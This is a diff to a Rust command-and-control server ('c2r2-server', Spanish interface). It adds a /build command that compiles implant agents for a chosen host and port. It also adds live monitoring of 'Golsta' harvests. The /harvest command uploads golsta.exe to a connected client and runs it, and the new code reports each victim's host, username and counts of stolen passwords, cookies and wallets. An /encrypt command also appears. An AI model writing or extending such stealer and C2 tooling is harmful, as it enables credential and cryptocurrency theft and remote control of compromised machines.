@@ -6,10 +6,10 @@ use rustls::pki_types::CertificateDer;
 use rustls::ServerConfig;
 use rustyline::error::ReadlineError;
 use rustyline::DefaultEditor;
-use std::collections::HashMap;
+use std::collections::{HashMap, HashSet};
 use std::env;
 use std::fs::{self, File};
-use std::io::BufReader as StdBufReader;
+use std::io::{BufReader as StdBufReader, Write as StdWrite};
 use std::path::PathBuf;
 use std::sync::atomic::{AtomicU64, Ordering};
 use std::sync::{Arc, Mutex};
@@ -23,9 +23,11 @@ use tracing_appender::rolling::{RollingFileAppender, Rotation};
 use tracing_subscriber::EnvFilter;
 
 // API module for team client communication
+mod agent_builder;
 mod api;
 use api::{
     create_api_router, AgentInfo as ApiAgentInfo, ApiState, DirEntry as ApiDirEntry, GolstaClient,
+    GolstaHarvest, GolstaHarvestList,
 };
 
 type ClientId = u64;
@@ -35,6 +37,29 @@ const CERTS_DIR: &str = "certs";
 const CERT_FILE: &str = "server.crt";
 const KEY_FILE: &str = "server.key";
 const GOLSTA_MODULE_NAME: &str = "golsta.exe";
+
+async fn show_build_progress() {
+    const FRAMES: [&str; 8] = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧"];
+    let mut frame = 0usize;
+    let mut progress = 3u8;
+
+    loop {
+        print!(
+            "\r{} Compilando agent... {:>3}%",
+            FRAMES[frame % FRAMES.len()],
+            progress
+        );
+        let _ = std::io::stdout().flush();
+        frame = frame.wrapping_add(1);
+        progress = progress.saturating_add(3).min(95);
+        tokio::time::sleep(std::time::Duration::from_millis(180)).await;
+    }
+}
+
+fn clear_build_progress() {
+    print!("\r\x1b[2K");
+    let _ = std::io::stdout().flush();
+}
 
 #[derive(Parser)]
 #[command(name = "c2r2-server")]
@@ -1122,6 +1147,104 @@ pub(crate) fn golsta_harvest_commands() -> Result<[String; 2], String> {
     golsta_harvest_commands_from(&module)
 }
 
+fn unseen_golsta_harvests(
+    list: GolstaHarvestList,
+    known_ids: &HashSet<String>,
+) -> Vec<GolstaHarvest> {
+    list.harvests
+        .into_iter()
+        .filter(|harvest| !known_ids.contains(&harvest.id))
+        .collect()
+}
+
+async fn watch_golsta_harvest(
+    golsta: GolstaClient,
+    known_ids: HashSet<String>,
+    client_id: ClientId,
+) {
+    let deadline = tokio::time::Instant::now() + std::time::Duration::from_secs(120);
+    let mut last_error = None;
+
+    loop {
+        match golsta.harvests().await {
+            Ok(list) => {
+                let new_harvests = unseen_golsta_harvests(list, &known_ids);
+                if !new_harvests.is_empty() {
+                    println!();
+                    println!(
+                        "{}",
+                        format!(
+                            "╔════════ GOLSTA — RESULTADO RECIBIDO [{}] ════════╗",
+                            client_id
+                        )
+                        .bright_green()
+                        .bold()
+                    );
+                    for harvest in new_harvests {
+                        println!(
+                            "  {} {} ({})",
+                            "Host:".bright_cyan().bold(),
+                            harvest.hostname.bright_white(),
+                            harvest.ip.bright_black()
+                        );
+                        println!(
+                            "  {} {}",
+                            "Usuario:".bright_cyan().bold(),
+                            harvest.username.bright_white()
+                        );
+                        println!(
+                            "  {} passwords={} cookies={} wallets={}",
+                            "Datos:".bright_cyan().bold(),
+                            harvest.password_count,
+                            harvest.cookie_count,
+                            harvest.wallet_count
+                        );
+                        println!(
+                            "  {} {} ({} bytes)",
+                            "Archivo:".bright_cyan().bold(),
+                            harvest.id.bright_white(),
+                            harvest.size_bytes
+                        );
+                        info!(
+                            "[{}] Golsta recibido: {} (passwords={}, cookies={}, wallets={})",
+                            client_id,
+                            harvest.id,
+                            harvest.password_count,
+                            harvest.cookie_count,
+                            harvest.wallet_count
+                        );
+                    }
+                    println!(
+                        "{}",
+                        "╚══════════════════════════════════════════════════╝".bright_green()
+                    );
+                    println!();
+                    return;
+                }
+            }
+            Err(error) => last_error = Some(error),
+        }
+
+        if tokio::time::Instant::now() >= deadline {
+            let detail = last_error
+                .map(|error| format!(" Último error: {error}"))
+                .unwrap_or_default();
+            warn!(
+                "[{}] Golsta no publicó un resultado nuevo dentro de 120s.{}",
+                client_id, detail
+            );
+            println!(
+                "{} Golsta no publicó un resultado nuevo dentro de 120s.{}",
+                "⚠️".bright_yellow(),
+                detail
+            );
+            return;
+        }
+
+        tokio::time::sleep(std::time::Duration::from_millis(500)).await;
+    }
+}
+
 #[tokio::main]
 async fn main() {
     let args = Args::parse();
@@ -1434,8 +1557,14 @@ async fn main() {
                             "  {} {:<20} {}",
                             "🔑".bright_red(),
                             "/harvest",
-                            "Sube y ejecuta Golsta; resultados en /api/golsta/harvests"
+                            "Sube y ejecuta Golsta; muestra el resultado nuevo en la CLI"
                                 .bright_white()
+                        );
+                        println!(
+                            "  {} {:<20} {}",
+                            "🔨".bright_cyan(),
+                            "/build --ip <host> --port <port> [--name <name>] [--production]",
+                            "Compila o recompila un agent desde el workspace".bright_white()
                         );
                         println!(
                             "  {} {:<20} {}",
@@ -1802,9 +1931,13 @@ async fn main() {
                         let selected = *selected_client.lock().unwrap();
 
                         if let Some(id) = selected {
-                            let clients = clients.lock().unwrap();
+                            let client_tx = clients
+                                .lock()
+                                .unwrap()
+                                .get(&id)
+                                .map(|client| client.tx.clone());
 
-                            if let Some(client) = clients.get(&id) {
+                            if let Some(client_tx) = client_tx {
                                 info!("[{}] Comando /harvest: ejecutando Golsta", id);
 
                                 let [upload_command, harvest_command] =
@@ -1835,9 +1968,40 @@ async fn main() {
                                         .bright_red()
                                 );
                                 println!();
+                                let live_results = match api_state.golsta.clone() {
+                                    Some(golsta) => match golsta.harvests().await {
+                                        Ok(list) => Some((
+                                            golsta,
+                                            list.harvests
+                                                .into_iter()
+                                                .map(|harvest| harvest.id)
+                                                .collect::<HashSet<_>>(),
+                                        )),
+                                        Err(error) => {
+                                            warn!(
+                                                "[{}] No se pudo iniciar el monitoreo Golsta: {}",
+                                                id, error
+                                            );
+                                            println!(
+                                                "{} No se pudo iniciar el monitoreo en vivo: {}",
+                                                "⚠️".bright_yellow(),
+                                                error
+                                            );
+                                            None
+                                        }
+                                    },
+                                    None => {
+                                        println!(
+                                            "{} Configurá GOLSTA_INTEGRATION_TOKEN para ver resultados en vivo.",
+                                            "⚠️".bright_yellow()
+                                        );
+                                        None
+                                    }
+                                };
+
                                 println!("{}", "  📤 Subiendo golsta.exe...".bright_yellow());
 
-                                if let Err(e) = client.tx.send(upload_command) {
+                                if let Err(e) = client_tx.send(upload_command) {
                                     error!("[{}] Error enviando golsta.exe: {}", id, e);
                                     println!("{} {}", "❌ Error:".bright_red().bold(), e);
                                     continue;
@@ -1846,15 +2010,20 @@ async fn main() {
                                 println!("{}", "  🚀 Ejecutando Golsta...".bright_yellow());
                                 println!(
                                     "{}",
-                                    "  📡 Resultados disponibles en /api/golsta/harvests"
+                                    "  📡 Esperando el resultado nuevo en esta CLI..."
                                         .bright_white()
                                         .dimmed()
                                 );
                                 println!();
 
-                                if let Err(e) = client.tx.send(harvest_command) {
+                                if let Err(e) = client_tx.send(harvest_command) {
                                     error!("[{}] Error enviando comando __HARVEST__: {}", id, e);
                                     println!("{} {}", "❌ Error:".bright_red().bold(), e);
+                                    continue;
+                                }
+
+                                if let Some((golsta, known_ids)) = live_results {
+                                    tokio::spawn(watch_golsta_harvest(golsta, known_ids, id));
                                 }
                             } else {
                                 println!("{} Cliente {} desconectado", "❌".bright_red(), id);
@@ -1867,6 +2036,57 @@ async fn main() {
                             );
                         }
                     }
+                    "/build" => match agent_builder::parse_request(&parts[1..]) {
+                        Ok(request) => {
+                            println!(
+                                "{} Compilando agent para {} ({})...",
+                                "🔨".bright_cyan(),
+                                request.server.bright_white(),
+                                if request.production {
+                                    "production"
+                                } else {
+                                    "dev"
+                                }
+                            );
+                            let progress_task = tokio::spawn(show_build_progress());
+                            let build_result = agent_builder::build(request).await;
+                            progress_task.abort();
+                            let _ = progress_task.await;
+                            clear_build_progress();
+
+                            match build_result {
+                                Ok(output) => {
+                                    let artifact_name = output
+                                        .artifact
+                                        .file_name()
+                                        .and_then(|name| name.to_str())
+                                        .unwrap_or("agent.exe");
+                                    println!(
+                                        "{} Agent generado junto al server: {} (100%)",
+                                        "✅".bright_green(),
+                                        artifact_name.bright_white()
+                                    );
+                                    if !output.stderr.trim().is_empty() {
+                                        println!("{} warnings/build stderr:", "ℹ️".bright_cyan());
+                                        println!("{}", output.stderr.trim());
+                                    }
+                                    if !output.stdout.trim().is_empty() && args.verbose {
+                                        println!("{}", output.stdout.trim());
+                                    }
+                                }
+                                Err(error) => {
+                                    error!("/build falló: {}", error);
+                                    println!("{} {}", "❌ Error:".bright_red().bold(), error);
+                                }
+                            }
+                        }
+                        Err(error) => {
+                            println!("{} {}", "❌ Uso:".bright_red().bold(), error);
+                            println!(
+                                    "   /build --ip 127.0.0.1 --port 4444 --name lab-agent --production"
+                                );
+                        }
+                    },
                     "/encrypt" => {
                         if parts.len() < 2 {
                             println!("{}  /encrypt <ruta> [max_depth]", "❌ Uso:".bright_red());
@@ -2514,7 +2734,9 @@ async fn main() {
 
 #[cfg(test)]
 mod tests {
-    use super::golsta_harvest_commands_from;
+    use super::{golsta_harvest_commands_from, unseen_golsta_harvests};
+    use crate::api::{GolstaHarvest, GolstaHarvestList};
+    use std::collections::HashSet;
 
     #[test]
     fn golsta_harvest_builds_ordered_upload_and_execute_commands() {
@@ -2523,5 +2745,32 @@ mod tests {
         assert_eq!(commands[0], "__UPLOAD__|golsta.exe|TVo=");
         assert_eq!(commands[1], "__HARVEST__");
         assert!(golsta_harvest_commands_from(b"not-a-pe").is_err());
+    }
+
+    #[test]
+    fn golsta_live_results_only_reports_new_archives() {
+        let harvest = |id: &str| GolstaHarvest {
+            id: id.to_string(),
+            country: "XX".to_string(),
+            ip: "192.0.2.10".to_string(),
+            hostname: "LAB".to_string(),
+            username: "fixture".to_string(),
+            size_bytes: 4,
+            created_at: "2026-09-23T00:00:00Z".to_string(),
+            password_count: 1,
+            cookie_count: 2,
+            wallet_count: 3,
+        };
+        let known_ids = HashSet::from(["old.zip".to_string()]);
+        let unseen = unseen_golsta_harvests(
+            GolstaHarvestList {
+                harvests: vec![harvest("new.zip"), harvest("old.zip")],
+                total: 2,
+            },
+            &known_ids,
+        );
+
+        assert_eq!(unseen.len(), 1);
+        assert_eq!(unseen[0].id, "new.zip");
     }
 }
